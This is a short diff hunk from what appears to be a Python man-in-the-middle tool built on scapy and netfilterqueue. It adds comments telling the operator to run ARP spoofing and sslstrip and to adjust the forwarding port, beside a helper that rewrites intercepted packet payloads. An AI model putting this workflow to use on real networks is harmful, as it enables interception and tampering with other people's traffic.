@@ -5,6 +5,10 @@ import netfilterqueue
 import scapy.all as scapy
 
 
+# In Terminal: start arp spoofing tool of choice
+# second terminal window run sslstrip
+# if only http sites change port 10000 to 80 and comment out subprocess bellow that forwards packets to port 10000
+
 def set_load(packet, load):
     packet[scapy.Raw].load = load
     del packet[scapy.IP].len
